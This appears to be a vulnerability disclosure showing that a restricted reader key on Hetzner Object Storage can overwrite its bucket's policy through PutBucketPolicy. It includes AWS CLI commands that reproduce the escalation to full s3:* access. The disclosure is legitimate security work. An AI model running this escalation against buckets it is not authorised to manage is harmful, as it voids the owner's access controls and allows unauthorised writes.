# S3 privilege escalation via PutBucketPolicy

A Hetzner Object Storage reader key can call `PutBucketPolicy` to remove its
own restrictions. Bucket policies are the only access control mechanism — once
overwritten, every restriction is void.

## Escalation sequence

1. Admin applies `DenyWrite` policy — reader gets `AccessDenied` on `PutObject`
2. Reader calls `PutBucketPolicy` with `Allow s3:* to *` — succeeds
3. Reader calls `PutObject` — succeeds

## Reproduce

Automated (requires `.env` with admin and reader keys):

```bash
set -a && source .env && set +a && uv run python scripts/blast_radius_demo.py
```

Manual with AWS CLI:

```bash
# 1. Admin applies DenyWrite policy to restrict the reader key
AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
aws s3api put-bucket-policy \
  --endpoint-url https://$S3_ENDPOINT \
  --bucket ducklake-guard \
  --policy '{
    "Version":"2012-10-17",
    "Statement":[{
      "Sid":"DenyWrite",
      "Effect":"Deny",
      "Principal":{"AWS":"arn:aws:iam:::user/p'$HETZNER_PROJECT_ID':'$S3_READER_ACCESS_KEY'"},
      "Action":["s3:PutObject","s3:DeleteObject","s3:AbortMultipartUpload"],
      "Resource":["arn:aws:s3:::ducklake-guard","arn:aws:s3:::ducklake-guard/*"]
    }]
  }'

# 2. Reader confirms write is blocked
AWS_ACCESS_KEY_ID=$S3_READER_ACCESS_KEY \
AWS_SECRET_ACCESS_KEY=$S3_READER_SECRET_KEY \
aws s3api put-object \
  --endpoint-url https://$S3_ENDPOINT \
  --bucket ducklake-guard \
  --key main/__test__ --body /dev/null
# -> AccessDenied

# 3. Reader replaces the policy (the escalation)
AWS_ACCESS_KEY_ID=$S3_READER_ACCESS_KEY \
AWS_SECRET_ACCESS_KEY=$S3_READER_SECRET_KEY \
aws s3api put-bucket-policy \
  --endpoint-url https://$S3_ENDPOINT \
  --bucket ducklake-guard \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:*","Resource":["arn:aws:s3:::ducklake-guard","arn:aws:s3:::ducklake-guard/*"]}]}'
# -> succeeds

# 4. Reader writes freely
AWS_ACCESS_KEY_ID=$S3_READER_ACCESS_KEY \
AWS_SECRET_ACCESS_KEY=$S3_READER_SECRET_KEY \
aws s3api put-object \
  --endpoint-url https://$S3_ENDPOINT \
  --bucket ducklake-guard \
  --key main/__test__ --body /dev/null
# -> succeeds (escalation confirmed)
```

## Root cause

Hetzner Object Storage has no IAM. Every credential in a project has identical
API-level permissions. Policy management actions (`PutBucketPolicy`,
`DeleteBucketPolicy`, `GetBucketPolicy`) bypass bucket policy evaluation.

Tested 2026-02-21 against Hetzner Object Storage (Ceph RGW), nbg1 region.
